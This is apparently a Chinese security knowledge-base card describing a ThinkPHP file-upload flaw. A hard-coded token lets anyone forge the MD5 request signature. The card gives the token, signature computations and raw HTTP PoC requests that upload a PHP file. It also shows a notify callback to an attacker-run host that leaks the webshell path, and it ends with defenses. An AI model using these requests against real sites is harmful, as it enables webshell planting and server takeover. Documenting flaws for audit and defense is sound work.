---
id: web-generic-file-upload-php-md5-sign-hardcoded-token-notify-path
title: PHP 上传接口 MD5 签名校验：硬编码 token 导致签名可伪造 + notify 回调外带上传路径
type: scenario
domain: web
path: web/generic/file-upload
technique: php-upload-md5-sign-hardcoded-token-notify-path
tags:
- php
- file-upload
- signature-bypass
- hardcoded-secret
- notify
- ssrf
- webshell
- source-audit
- thinkphp
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V521
  verified_at: '2026-11-11T13:21:21+08:00'
  notes: 已对照原文 content.md 与全部 36 张截图核对：public/server/index.php start()（图21）校验 md 属于 upload/download、sign 非空，sign_verify->sign_params（图22-24）先过滤空值与 sign 本身、ksort 后经 http_build_query+str_urldecode 拼接再接 config[token] 取 md5；硬编码 token asdasfasfasfasfasfa（图29）；md5(md=upload&uid=1+token)=e8766abd8742eb67a2c07b089ecf636a 通过校验，1.php 上传成功落盘 public/server/upload/20240106/1/file_xxx.php（图30-33，接口返回'同步错误'）；upload_notify（图35）以 curl GET+URL query 携带 name/ext/path/size/mime/uid/folder_id/policy_id/sign 发往可控 notify，图36 nc 实际抓到 path=/upload/20240106/1/file_xxx.php 与 sign。已修正卡片：签名算法补 ksort/http_build_query/str_urldecode 细节；步骤5 由'请求体'改为请求 URL query；删除'原文据此访问 webshell 成功'的过度表述（原文只截图本地落盘与回调抓包，未截图访问执行），步骤6 改为按路径访问、前缀随部署。dedup：候选为前端 RC4+MD5 签名、JSRPC 动态签名、Cookie 序列化签名伪造等不同场景，非同链；dup-scan.json 无涉及本卡 pair。未验证点：未复现；上传目录 Web 可达性原文未截图证明；原文未标注产品名与版本，affected_versions 保持为空。
url: /docs/web/generic/file-upload/web-generic-file-upload-php-md5-sign-hardcoded-token-notify-path/
draft: false
kb_aliases:
- sign_verify sign_params
- 上传签名伪造
- 硬编码 token 签名
- upload_notify 路径外带
- ThinkPHP 文件管理上传 getshell
- move_uploaded_file 签名接口
---

## 一句话结论

某 PHP 文件管理应用（ThinkPHP）的上传入口 `public/server/index.php` 在 `start()` 中调用受保护的上传方法，并用 `sign_verify → sign_params` 校验 `md/uid/notify` 等 GET 参数与 `$this->config['token']` 拼接后的 MD5；由于 token 在源码中硬编码（原文为 `asdasfasfasfasfasfa`），攻击者可直接算出合法 `sign` 上传任意 PHP 文件；上传返回信息不含路径，但代码接着把含上传路径的 `$info` 以 GET 请求附加到攻击者可控的 `notify` 地址，攻击者用自己的 HTTP 服务接收即可拿到 webshell 路径。

## 原理

- **入口与调用关系**：`public/server/index.php#start()` 调用 `upload($command, $sign)`；`upload` 为 `protected`，正常外部不能直接调用，但会经 `start()` 的 `protected` 上下文执行，其中包含 `move_uploaded_file` 的上传逻辑。
- **签名算法可复现**：`sign_verify($params, $sign)` 调用 `sign_params`，先过滤空值与 `sign` 本身，把其余 GET 参数 `ksort` 后经 `http_build_query` + `str_urldecode` 拼接，再拼上 `$this->config['token']` 取 MD5，与传入 `$sign` 比较。也就是说签名只依赖“请求参数 + 一个固定 token”，没有任何随机数/时间戳/服务端会话参与。
- **token 硬编码**：token 直接写在应用配置里（原文 `$this->config['token'] = 'asdasfasfasfasfasfa'`），任何能读到源码（泄露、审计、供应链）的人都能离线构造签名。原文用 `<?php echo md5("md=upload&uid=1asdasfasfasfasfasfa");?>` 得到 `sign`，上传请求通过校验。
- **上传不校验类型**：`upload_file($uid)` 直接调用 `move_uploaded_file` 保存上传内容，原文上传 `1.php`（phpinfo）成功落盘，未见有效的扩展名/内容/MIME 白名单。原文上传后接口返回“同步错误”，但文件实际已保存，不影响利用。
- **路径外带**：上传成功后代码执行 `$this->upload_notify($_GET['notify'], $info)`，把含上传路径的 `$info` 与签名拼进 URL query，以 GET 请求发到 `notify` 指定地址（类 SSRF/回调）。上传路径通常未知，攻击者把自己控制的 HTTP 服务填进 `notify`，即可在请求 URL 参数里收到包含路径的 `$info`；原文实测通过回调成功获取上传路径（文件已落盘于 `public/server/upload/...`，原文未截图访问执行）。
- **为什么 notify 阶段验签无关紧要**：文件在 notify 之前已经落盘；即使 notify 请求的签名需要重新计算，token 已知，攻击者按同样方式对 `md=upload&notify=...&uid=1` 重算即可（原文示例 `md5("md=upload&notify=http://127.0.0.1:8877/&uid=1asdasfasfasfasfasfa")`）。

## 触发条件

- 应用暴露 `server/index.php/start` 路由，且上传方法依赖的签名 token 硬编码/可从源码获得。
- 上传目录可被 Web 访问（或可结合路径穿越/解析漏洞执行）。
- 攻击者可启动一个 HTTP 服务接收 notify 回调（或可指定内网可访问的回调地址）。
- 应用未对上传类型做白名单校验。

## 利用步骤

1. 审计源码确认 `sign_params` 的参数排序规则与硬编码 token。
2. 计算上传签名：`md5("md=upload&uid=1" + token)`。
3. 构造 multipart POST 上传 PHP 文件（原文 `1.php`，内容 `<?php phpinfo(); ?>`），带 `md=upload&uid=1&sign=<sign>`。
4. 计算带 notify 的签名：`md5("md=upload&notify=http://attacker:8877/&uid=1" + token)`，再次上传并在 `notify` 填自己的 HTTP 服务地址。
5. 在 HTTP 服务日志/请求 URL query 中读取 `$info` 里的上传路径（原文上传返回“同步错误”，但 `$info` 中已含路径）。
6. 按获取到的路径访问上传文件（原文落盘为 `public/server/upload/20240106/1/file_xxx.php`，Web 访问前缀取决于站点部署）。

## PoC

生成签名（原文）：

```php
<?php echo md5("md=upload&uid=1asdasfasfasfasfasfa"); ?>
// e8766abd8742eb67a2c07b089ecf636a
```

上传请求（原文）：

```http
POST /server/index.php/start?md=upload&uid=1&sign=e8766abd8742eb67a2c07b089ecf636a HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=--------------------------570796120375390059114427

----------------------------570796120375390059114427
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/x-httpd-php

<?php phpinfo(); ?>
----------------------------570796120375390059114427--
```

获取路径（原文）：

```php
<?php echo md5("md=upload&notify=http://127.0.0.1:8877/&uid=1asdasfasfasfasfasfa"); ?>
// 88c03d47ed5a1df9ed7ed9e1c1ce8afd
```

```http
POST /server/index.php/start?md=upload&uid=1&notify=http://127.0.0.1:8877/&sign=88c03d47ed5a1df9ed7ed9e1c1ce8afd HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=--------------------------570796120375390059114427

----------------------------570796120375390059114427
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/x-httpd-php

<?php phpinfo(); ?>
----------------------------570796120375390059114427--
```

攻击者 HTTP 服务收到 notify GET 请求，query 中带上传路径（原文截图可见 `path=/upload/20240106/1/file_xxx.php`）；文件已落盘（原文图 33 本地可见），原文未截图访问 webshell。

## 变体与关联

- **签名伪造的同类场景**：前端 JS 暴露 RC4/MD5 密钥的签名伪造见 [[web-generic-file-upload-frontend-rc4-md5-signature-forge]]；其他上传鉴权绕过（注释权限、扩展名）见 [[web-php-framework-yii-oa-saveupload-commented-extension-unauth-upload]]、[[web-php-framework-yii2-uploadedfile-saveas-unfiltered]]。
- **notify 外带的通用性**：任何“上传后回调第三方 URL 并携带文件信息”的设计，都可能被攻击者用来获取路径/内网探测（SSRF），审计时应检查回调地址是否用户可控。
- **进一步利用**：拿到路径后可上传免杀 webshell、结合 `.htaccess`/解析漏洞；若上传目录不可访问，可尝试路径穿越或日志包含。

## 检测与防御

- **签名机制**：签名密钥必须随机生成、服务端安全存储（环境变量/KMS），禁止硬编码在源码或配置文件中；签名应包含时间戳/nonce 防重放，服务端校验签名与参数一致性。
- **上传校验**：扩展名/内容类型白名单、重命名（随机文件名 + 固定后缀）、上传目录禁止脚本执行（Nginx `location` 禁用 PHP 解析）。
- **回调安全**：`notify` 等回调地址使用白名单/固定域名，禁止用户任意指定；回调请求不要携带敏感路径信息，或至少做鉴权。
- **检测**：审计 `sign_verify`/`sign_params` 实现与 token 来源；日志中关注对 `server/index.php/start` 的大文件 multipart 请求与异常 `notify` 外连；上传目录出现 `.php` 新文件告警。
